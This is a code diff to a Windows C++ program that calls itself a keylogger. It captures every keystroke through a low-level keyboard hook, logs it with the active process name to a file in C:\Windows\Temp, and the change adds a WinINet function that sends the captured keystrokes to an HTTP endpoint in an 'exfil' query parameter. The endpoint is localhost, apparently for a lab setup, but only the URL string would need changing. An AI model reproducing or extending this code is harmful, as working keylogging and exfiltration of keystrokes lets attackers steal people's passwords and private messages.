@@ -8,13 +8,18 @@
 #define _UNICODE
 #define UNICODE
 #pragma comment(lib, "User32.lib")
+#pragma warning(push)
+#pragma warning(disable : 4820)
 #include <windows.h>
+#include <wininet.h>
+#pragma warning(pop)
 #include <iostream>
 #include <vector>
 #include <fstream>
 #include <memory>
 #include <sstream>
 #include <string>
+#pragma comment(lib, "wininet.lib")
 
 // ============================================================================
 // CONFIGURATION
@@ -29,7 +34,7 @@ constexpr UINT FLUSH_TIMER_INTERVAL_MS = 60000;
 struct KeyloggerState
 {
     std::wstring currentProcessName;
-    std::vector<std::wstring> keystrokeBuffer;
+    std::wstring keystrokeBuffer;
     SYSTEMTIME bufferStartTime;
     size_t currentBufferSize = 0;
 
@@ -49,23 +54,56 @@ static const std::wstring LOG_PATH = L"C:\\Windows\\Temp\\winkey.log";
 // ============================================================================
 // UTILITY FUNCTIONS
 // ============================================================================
-
-FILE *OpenLogFile()
+#define EXFIL_URL
+void sendRequest(const std::wstring &message)
 {
-    FILE *f = nullptr;
-    errno_t err = _wfopen_s(&f, LOG_PATH.c_str(), L"a+");
 
-    if (err != 0 || f == nullptr)
+    std::wstring url = L"http://localhost:8080/?exfil=" + message;
+
+    HINTERNET hInternet = InternetOpenW(
+        L"winkey",
+        INTERNET_OPEN_TYPE_PRECONFIG,
+        nullptr,
+        nullptr,
+        0);
+
+    if (!hInternet)
+        return;
+
+    HINTERNET hUrl = InternetOpenUrlW(
+        hInternet,
+        url.c_str(),
+        nullptr,
+        0,
+        INTERNET_FLAG_RELOAD,
+        0);
+
+    if (!hUrl)
     {
-        std::wstringstream ss;
-        ss << L"FAILED to open log file! errno=" << err
-           << L", GetLastError=" << GetLastError();
-        OutputDebugStringW(ss.str().c_str());
-        return nullptr;
+        InternetCloseHandle(hInternet);
+        return;
     }
 
-    OutputDebugStringW(L"Log file opened successfully");
-    return f;
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+}
+
+void LogEvent(const std::wstring &message)
+{
+    std::wstring logPath = L"C:\\Windows\\Temp\\winkey.log";
+
+    std::wofstream file(logPath, std::ios::app);
+    if (!file)
+    {
+        std::wstring buf =
+            L"Failed to open log file: " + logPath +
+            L", GetLastError=" + std::to_wstring(GetLastError());
+
+        OutputDebugStringW(buf.c_str());
+        return;
+    }
+
+    file << message << L'\n';
 }
 
 std::wstring FormatTimestamp(const SYSTEMTIME &st)
@@ -89,32 +127,10 @@ void FlushBuffer()
         return;
     }
 
-    std::wstringstream ss;
-    ss << L"    Buffer has " << g_state.keystrokeBuffer.size() << L" keystrokes";
-    OutputDebugStringW(ss.str().c_str());
-
-    FILE *logFile = OpenLogFile();
-    if (!logFile)
-    {
-        OutputDebugStringW(L"Cannot flush: failed to open log file");
-        return;
-    }
-    // Format: [timestamp] ProcessName :\n key1key2key3...
     std::wstring timestamp = FormatTimestamp(g_state.bufferStartTime);
-    fwprintf(logFile, L"%s - %s :\n",
-             timestamp.c_str(),
-             g_state.currentProcessName.c_str());
 
-    // Écrit toutes les touches du buffer
-    for (const auto &key : g_state.keystrokeBuffer)
-    {
-        fwprintf(logFile, L"%s", key.c_str());
-    }
-
-    fwprintf(logFile, L"\n");
-    fflush(logFile); // Force instant writing
-    fclose(logFile);
-
+    LogEvent(timestamp + L" - " + g_state.currentProcessName + L"\n" + g_state.keystrokeBuffer + L"\n");
+    sendRequest(g_state.currentProcessName + L" : " + g_state.keystrokeBuffer);
     OutputDebugStringW(L"Buffer flushed successfully to file");
 
     // Clear buffer
@@ -165,7 +181,7 @@ void HandleProcessChange(const std::wstring &newProcessName)
 // ============================================================================
 void AddKeystrokeToBuffer(const std::wstring &key)
 {
-    g_state.keystrokeBuffer.push_back(key);
+    g_state.keystrokeBuffer.append(key);
     g_state.currentBufferSize += key.length();
 
     if (g_state.currentBufferSize >= MAX_BUFFER_CHARS)
@@ -369,7 +385,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
         // Ne pas afficher Ctrl+Alt si les DEUX sont pressés (c'est AltGr)
         bool isAltGr = (g_state.ctrlDown && g_state.altDown);
-
         // Build modifier prefix (Ctrl / Alt / Shift / Win)
 
         if (g_state.ctrlDown && !isAltGr)
@@ -414,22 +429,11 @@ int main()
     g_state.capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
     // Instant writing test
-    FILE *testFile = OpenLogFile();
-    if (testFile)
-    {
-        SYSTEMTIME st;
-        GetLocalTime(&st);
-        std::wstring timestamp = FormatTimestamp(st);
-        fwprintf(testFile, L"%s === Keylogger Started ===\n", timestamp.c_str());
-        fflush(testFile);
-        fclose(testFile);
-        OutputDebugStringW(L"Startup message written to log");
-    }
-    else
-    {
-        MessageBoxW(NULL, L"CANNOT OPEN LOG FILE AT STARTUP!", L"CRITICAL ERROR", MB_OK | MB_ICONERROR);
-        return 1;
-    }
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    std::wstring timestamp = FormatTimestamp(st);
+    LogEvent(timestamp + L" === Keylogger Started ===\n");
+    OutputDebugStringW(L"Startup message written to log");
 
     HHOOK hKeyboardHook;
     // Hook installation
